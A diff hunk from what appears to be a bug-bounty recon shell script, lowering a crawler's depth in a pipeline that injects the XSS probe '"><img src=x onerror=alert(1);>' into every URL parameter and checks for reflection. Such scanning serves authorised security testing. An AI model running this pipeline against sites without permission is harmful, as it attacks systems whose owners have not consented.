@@ -75,7 +75,7 @@ echo
 
 echo ================"INIT XSS2"================ | anew xss2
 echo
-echo $(cat url) | httpx-toolkit -silent | katana -d 10 -silent | uro | qsreplace '"><img src=x onerror=alert(1);>' | freq | egrep -v 'Not' | anew xss2;
+echo $(cat url) | httpx-toolkit -silent | katana -d 5 -silent | uro | qsreplace '"><img src=x onerror=alert(1);>' | freq | egrep -v 'Not' | anew xss2;
 echo
 echo
 echo
